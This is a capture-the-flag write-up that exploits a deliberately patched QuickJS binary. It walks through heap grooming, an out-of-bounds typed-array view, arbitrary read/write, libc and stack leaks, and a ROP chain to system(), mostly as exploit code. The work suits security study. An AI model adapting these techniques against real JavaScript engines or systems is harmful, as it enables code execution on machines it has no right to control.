## Challenge

> PWN#006 — 136 points. Get a shell on the remote host and read the flag.

The service is a thin wrapper around the QuickJS command-line interpreter. It reads a script from the connection, writes it to `/tmp/script.<random>.js`, and executes `qjs` with that file. Input is split by a line containing `###RUN###`: everything before it is the script, everything after it is fed to the process stdin.

The handout ships the exact `qjs` binary and the Debian glibc 2.42-13 runtime it was built against. The remote process runs as `nobody` with cwd `/challenge`; the flag lives at `/flag/flag.txt`.

## Analysis

### Version and build

`qjs` is a PIE, NX is enabled, there is no stack canary, and the binary is stripped — but it was linked with `-rdynamic`, so every internal `JS_*`/`js_*` symbol is still exported. That turns the binary itself into a usable ROP anchor even without a libc leak for the executable.

Recompiling upstream QuickJS `2024-01-13` with the same toolchain (Debian gcc 14.2.0-19) produced a nearly identical binary: after normalising branch targets, every function except `js_std_add_helpers` and `JS_NewCFunctionData` matched in size and instruction sequence. The two exceptions differ only in jump offsets and NOP padding caused by internal address layout. In other words, the challenge binary is stock `2024-01-13` plus one deliberate change.

### The patch

In `js_typed_array_constructor`, the bounds check for a view over an existing `ArrayBuffer` is:

```c
if ((offset + (len << size_log2)) > abuf->byte_length) {
invalid_length:
    return JS_ThrowRangeError(ctx, "invalid length");
}
```

In the challenge binary the comparison constant is widened by `0x1000`:

```c
if ((offset + (len << size_log2)) > abuf->byte_length + 0x1000)
```

A typed-array view can therefore extend up to 4 KiB past the end of its backing store. Vanilla QuickJS rejects the same construction with `RangeError: invalid length`. This is the only vulnerability required for the exploit: `new Uint8Array(abA, 0, 0x1800)` succeeds on an `ArrayBuffer(0x800)`.

### Object layout

The build uses the usual 64-bit QuickJS layouts (verified in gdb against a local build of the same source):

| Structure | Size | Relevant fields |
|---|---:|---|
| `JSObject` | `0x48` | `u.array` @ `0x30`, `u.array.u.ptr` @ `0x38`, `u.array.count` @ `0x40`, `class_id` @ `0x6` |
| `JSArrayBuffer` | `0x30` | `byte_length` @ `0x0`, `detached` @ `0x4`, `data` @ `0x8` |
| `JSTypedArray` | `0x28` | `obj` @ `0x10`, `buffer` @ `0x18`, `offset` @ `0x20`, `length` @ `0x24` |

For a typed array, `JSObject.u.array.u.ptr` points at the element storage and `u.array.count` holds the element count. Overwriting that pointer gives an arbitrary 8-byte read/write primitive through the array elements.

### Remote environment

The wrapper does not pass `--std`, so the `std` and `os` modules are unavailable; only `print`, `console`, and `scriptArgs` exist. `import()` still goes through the module loader, but syntax-error feedback is too limited to leak files. Since there is no `gc()` helper, garbage collection has to be forced by allocating a large object and dropping it.

## Solution

### 1. Heap grooming

Allocate 400 small typed arrays first:

```js
let pad = [];
for (let i = 0; i < 400; i++) pad.push(new Uint8Array(8));
```

This drains the tcache for the `0x20`-ish size class, so the `JSObject` structures allocated later end up in fresh heap memory immediately after the oversized view — inside the 4 KiB OOB window.

### 2. Build the OOB window

```js
let abA = new ArrayBuffer(0x800);
new Uint8Array(abA).fill(0xaa);
let oob = new Uint8Array(abA, 0, 0x1800);   // accepted because of the +0x1000 patch
let probe0 = new Uint8Array(abA, 0, 0x1700);
```

`oob` starts at `abA->data` and spans `0x1800` bytes: the real `0x800` bytes of the buffer plus `0x1000` bytes of adjacent heap. `probe0` is a second view whose `JSObject` records `u.array.u.ptr = abA->data` and `count = 0x1700`; scanning the OOB window for those two values reveals the absolute address `A` of the backing store.

```js
let A = 0n;
for (let i = 0; i < 0x1800 - 0x48; i++) {
    if (u32(i + 0x40) === 0x1700) {
        let q = u64(i + 0x38);
        if (q > 0x500000000000n && q < 0x600000000000n) { A = q; break; }
    }
}
```

### 3. Arbitrary read/write

Create a second buffer and a view over it, then locate the view's `JSObject` in the OOB window by its count (`0x500`) and its data pointer (`Qt`, which must fall inside the window and point at `0xcc` filler):

```js
let tgt = new ArrayBuffer(0x500); new Uint8Array(tgt).fill(0xcc);
let tv  = new Uint8Array(tgt, 0, 0x500);

let Ot = -1, Qt = 0n;
for (let i = 0; i < 0x1800 - 0x48; i++) {
    if (u32(i + 0x40) === 0x500) {
        let q = u64(i + 0x38);
        if (q > A && q - A < 0x1800n && oob[Number(q - A)] === 0xcc) {
            Ot = i; Qt = q; break;
        }
    }
}
```

`Ot` is the offset of `tv`'s `JSObject` inside the OOB window. Writing to `oob[Ot + 0x38]` changes `tv`'s element pointer; the elements of `tv` then alias the target address:

```js
function rd64(a) { w64o(Ot + 0x38, a); let r = 0n; for (let i = 7; i >= 0; i--) r = (r << 8n) | BigInt(tv[i]); return r; }
function rd32(a) { w64o(Ot + 0x38, a); return (tv[0] | (tv[1] << 8) | (tv[2] << 16) | (tv[3] << 24)) >>> 0; }
function wr64(a, v) { w64o(Ot + 0x38, a); for (let i = 0; i < 8; i++) tv[i] = Number((v >> BigInt(8 * i)) & 0xffn); }
function restore() { w64o(Ot + 0x38, Qt); }
```

### 4. libc leak

A `0x500`-byte buffer (`big`) is allocated between `tgt` and a guard buffer, then dropped. A large allocation (`new ArrayBuffer(0x4000000)`) forces a GC, and the freed `0x500` chunk lands in the unsorted bin. Its `fd`/`bk` pointers — `main_arena` addresses, i.e. `libc + 0x1e7b20` and friends — are written into the chunk data, which is inside the OOB window.

The base is recovered by testing each leaked pointer against the known unsorted-bin offsets, requiring a page-aligned result whose first four bytes are the ELF magic `\x7fELF`:

```js
const offs = [0x1e7b20n, 0x1e7b30n, 0x1e7b40n, 0x1e7b50n, 0x1e7b60n, 0x1e7b70n];
for (const [k, _] of freq.entries()) {
    let v = BigInt('0x' + k);
    for (const off of offs) {
        if (((v - off) & 0xfffn) !== 0n) continue;
        let b = v - off;
        if (b < 0x7f0000000000n || b >= 0x800000000000n) continue;
        if (rd32(b) === 0x464c457f) { libcBase = b; break; }
    }
}
```

### 5. Stack and return address

`environ` is at `libc + 0x1eee28`. Reading it yields a stack pointer; the saved return address of `main` (`__libc_start_call_main`'s call site) is at `environ - 0x128`, i.e. `libc + 0x29f75` in this build. A fallback scan of `0x8000` bytes below `environ` handles layout differences.

### 6. ROP

The command string is written into the OOB window at `A + 0x700`, which is a known address. The return slot gets:

```text
[ret]            libc+0x2a9b8   (only if R & 0xf == 8, for 16-byte alignment)
[pop rdi; ret]   libc+0x2a9b7
[arg]            A+0x700
[system]         libc+0x54790
```

The script then ends, `main` returns, and the chain executes `system("cat /flag/flag.txt")`.

## Notes

* Run the local binary with the bundled loader and libc:
  `~/pwn006/ld-linux-x86-64.so.2 --library-path ~/pwn006 ~/pwn006/qjs exploit.js`.
  Using the system glibc (2.43) shifts `main_arena` and `__libc_start_call_main`, so the hard-coded offsets stop matching.
* There is no `gc()`/`std`/`os` on the remote. GC must be triggered by a large allocation.
* `oob` must be created before the target `JSObject`s; the 4 KiB window is only large enough to reach objects allocated immediately after the backing store.
* The arbitrary read/write is 8 bytes at a time through `tv`; always restore `Qt` before allocating anything else, otherwise the engine dereferences a bogus element pointer during GC.
